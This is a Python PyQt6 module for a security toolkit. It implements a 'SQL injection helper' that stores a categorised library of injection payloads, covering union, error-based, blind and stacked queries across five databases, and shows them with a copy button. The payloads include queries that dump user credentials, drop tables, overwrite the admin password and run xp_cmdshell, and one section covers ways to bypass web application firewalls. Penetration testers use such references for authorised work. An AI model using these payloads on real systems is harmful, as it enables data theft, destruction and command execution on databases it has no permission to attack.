"""
SQL 注入检测辅助 — Payload 库 + 布尔/时间盲注辅助 + WAF 绕过参考。

特性:
  - 按数据库分类: MySQL / MSSQL / Oracle / PostgreSQL / SQLite
  - 注入类型: 联合查询 / 报错注入 / 布尔盲注 / 时间盲注 / 堆叠查询
  - WAF 绕过技巧参考
  - 一键复制 Payload
  - 编码绕过提示
"""

from __future__ import annotations

from typing import Any, Optional

from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtWidgets import (
    QComboBox,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QListWidget,
    QListWidgetItem,
    QPushButton,
    QSplitter,
    QTabWidget,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from core.tool_base import BaseTool, ToolCategory, ToolMeta
from core.tool_registry import register_tool

SQLI_PAYLOADS = {
    "联合查询 (UNION)": {
        "MySQL": [
            "' UNION SELECT 1,2,3-- -",
            "' UNION SELECT 1,2,database()-- -",
            "' UNION SELECT 1,2,@@version-- -",
            "' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -",
            "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -",
        ],
        "MSSQL": [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,@@version--",
            "' UNION SELECT 1,2,table_name FROM information_schema.tables--",
            "' UNION SELECT 1,2,name FROM master..sysdatabases--",
        ],
        "Oracle": [
            "' UNION SELECT 1,2,3 FROM dual--",
            "' UNION SELECT 1,2,banner FROM v$version--",
            "' UNION SELECT 1,2,table_name FROM all_tables--",
        ],
        "PostgreSQL": [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,version()--",
            "' UNION SELECT 1,2,tablename FROM pg_tables--",
        ],
        "SQLite": [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,sqlite_version()--",
            "' UNION SELECT 1,2,tbl_name FROM sqlite_master--",
        ],
    },
    "报错注入": {
        "MySQL": [
            "' AND extractvalue(1,concat(0x7e,database()))-- -",
            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
            "' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ],
        "MSSQL": [
            "' AND 1=convert(int,(SELECT @@version))--",
            "';DECLARE @x INT;SELECT @x=1/0--",
        ],
        "Oracle": [
            "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))--",
        ],
        "PostgreSQL": [
            "' AND cast((SELECT version()) AS int)--",
        ],
    },
    "布尔盲注": {
        "通用": [
            "' AND 1=1-- -",
            "' AND 1=2-- -",
            "' AND SUBSTRING((SELECT database()),1,1)='a'-- -",
            "' AND (SELECT LENGTH(database()))>5-- -",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -",
        ],
    },
    "时间盲注": {
        "MySQL": [
            "' AND SLEEP(5)-- -",
            "' AND IF(1=1,SLEEP(5),0)-- -",
            "';SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END-- -",
        ],
        "MSSQL": [
            "';WAITFOR DELAY '0:0:5'--",
            "';IF (1=1) WAITFOR DELAY '0:0:5'--",
        ],
        "PostgreSQL": [
            "';SELECT pg_sleep(5)--",
        ],
        "Oracle": [
            "';BEGIN DBMS_LOCK.SLEEP(5);END;--",
        ],
    },
    "堆叠查询": {
        "通用": [
            "';INSERT INTO users VALUES('hacker','pass')--",
            "';DROP TABLE users--",
            "';UPDATE users SET password='hacked' WHERE username='admin'--",
            "';EXEC xp_cmdshell('whoami')--",
        ],
    },
    "绕过技巧": {
        "注释绕过": [
            "'/**/OR/**/1=1--",
            "'%23%0AOR 1=1--",
            "'/*!50000OR*/1=1--",
        ],
        "空格绕过": [
            "' OR 1=1--",
            "'\tOR\t1=1--",
            "'%0AOR%0A1=1--",
            "'+(SELECT+1)=1--",
            "'OR(1=1)--",
        ],
        "关键字绕过": [
            "' UNunionION SELselectECT 1,2,3-- -",
            "'/**/UNunion/**/SEselectLECT 1,2,3-- -",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -",
        ],
        "编码绕过": [
            "CHAR(115,101,108,101,99,116) → 'select'",
            "0x73656c656374 → 'select'",
            "CONCAT(CHAR(115),CHAR(101),CHAR(108)) → 'sel'",
        ],
    },
}


class SqliHelperWidget(QWidget):
    """SQLi 辅助 UI"""

    def __init__(self, parent: Optional[QWidget] = None) -> None:
        super().__init__(parent)
        self._init_ui()

    def _init_ui(self) -> None:
        layout = QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        # ---- 数据库选择 ----
        db_row = QHBoxLayout()
        db_row.addWidget(QLabel("数据库:"))
        self._db_combo = QComboBox()
        self._db_combo.addItems(["MySQL", "MSSQL", "Oracle", "PostgreSQL", "SQLite", "通用"])
        self._db_combo.setCurrentText("MySQL")
        self._db_combo.setStyleSheet(_combo_style())
        db_row.addWidget(self._db_combo, stretch=1)
        layout.addLayout(db_row)

        # ---- Payload 分类 ----
        splitter = QSplitter(Qt.Orientation.Horizontal)

        self._cat_tabs = QTabWidget()
        self._cat_tabs.setStyleSheet(_tab_style())
        self._payload_lists: dict[str, QListWidget] = {}

        for cat, db_payloads in SQLI_PAYLOADS.items():
            lst = QListWidget()
            lst.setStyleSheet(_list_style())
            self._cat_tabs.addTab(lst, cat)
            self._payload_lists[cat] = lst

        self._cat_tabs.currentChanged.connect(self._on_tab_changed)
        splitter.addWidget(self._cat_tabs)

        # Payload 详情
        right = QWidget()
        rl = QVBoxLayout(right)
        rl.setContentsMargins(8, 0, 0, 0)
        rl.addWidget(QLabel("选中的 Payload:"))
        self._payload_edit = QTextEdit()
        self._payload_edit.setStyleSheet(_textarea_style())
        self._payload_edit.setMaximumHeight(80)
        rl.addWidget(self._payload_edit)

        rl.addWidget(QLabel("编码/绕过建议:"))
        self._tip_edit = QTextEdit()
        self._tip_edit.setReadOnly(True)
        self._tip_edit.setStyleSheet(_textarea_style())
        rl.addWidget(self._tip_edit, stretch=1)

        btn_row = QHBoxLayout()
        copy_btn = QPushButton("📋 复制 Payload")
        copy_btn.setStyleSheet(_btn_primary_style())
        copy_btn.clicked.connect(self._copy)
        btn_row.addWidget(copy_btn)
        btn_row.addStretch()
        rl.addLayout(btn_row)

        splitter.addWidget(right)
        splitter.setSizes([350, 500])
        layout.addWidget(splitter, stretch=1)

        self._on_tab_changed(0)

    def _on_tab_changed(self, idx: int) -> None:
        cat = self._cat_tabs.tabText(idx)
        lst = self._payload_lists.get(cat)
        if not lst:
            return
        lst.clear()
        db = self._db_combo.currentText()
        payloads = SQLI_PAYLOADS.get(cat, {})

        if "通用" in payloads:
            items = payloads["通用"]
        elif db in payloads:
            items = payloads[db]
        else:
            items = []

        for p in items:
            item = QListWidgetItem(p)
            lst.addItem(item)

        lst.itemClicked.connect(self._on_select)

    def _on_select(self, item: QListWidgetItem) -> None:
        self._payload_edit.setPlainText(item.text())
        self._tip_edit.setPlainText(
            "提示:\n"
            "- 根据实际注入点调整引号和注释符\n"
            "- 使用编码绕过 WAF (URL/Hex/大小写)\n"
            "- 建议先确认注入类型再选择 Payload"
        )

    def _copy(self) -> None:
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(self._payload_edit.toPlainText())


@register_tool
class SqliHelperTool(BaseTool):
    """SQL 注入辅助"""

    meta = ToolMeta(
        name="sqli_helper",
        display_name="SQL 注入辅助",
        category=ToolCategory.WEB_TESTING,
        description="SQL 注入 Payload 库，按数据库和注入类型分类，含绕过技巧",
        icon="🗄️",
        version="1.0.0",
        keywords=["sql", "注入", "sqli", "payload", "绕过", "waf"],
    )

    def __init__(self) -> None:
        super().__init__()
        self._widget: Optional[SqliHelperWidget] = None

    def create_widget(self) -> QWidget:
        self._widget = SqliHelperWidget()
        return self._widget

    def execute(self, params: dict[str, Any]) -> str:
        return ""

    def validate_params(self, params: dict[str, Any]) -> list[str]:
        return []


# ---- 样式 ----
def _combo_style() -> str:
    return """QComboBox { background-color: #313244; color: #cdd6f4;
        border: 1px solid #45475a; border-radius: 6px;
        padding: 8px 12px; font-size: 13px; }"""


def _textarea_style() -> str:
    return """QTextEdit { background-color: #11111b; color: #cdd6f4;
        border: 1px solid #313244; border-radius: 6px;
        padding: 8px; font-family: Consolas, monospace; font-size: 12px; }"""


def _btn_primary_style() -> str:
    return """QPushButton { background-color: #cba6f7; color: #1e1e2e;
        border: none; border-radius: 6px;
        padding: 8px 20px; font-size: 13px; font-weight: bold; }
        QPushButton:hover { background-color: #b4befe; }"""


def _tab_style() -> str:
    return """QTabWidget::pane { border: 1px solid #313244; background-color: #1e1e2e; }
        QTabBar::tab { background-color: #181825; color: #a6adc8;
        padding: 4px 10px; font-size: 11px; }
        QTabBar::tab:selected { background-color: #1e1e2e; color: #cdd6f4; }"""


def _list_style() -> str:
    return """QListWidget { background-color: #11111b; color: #cdd6f4;
        border: none; font-family: Consolas, monospace; font-size: 11px; }
        QListWidget::item { padding: 6px 8px; }
        QListWidget::item:hover { background-color: #313244; }
        QListWidget::item:selected { background-color: #45475a; }"""
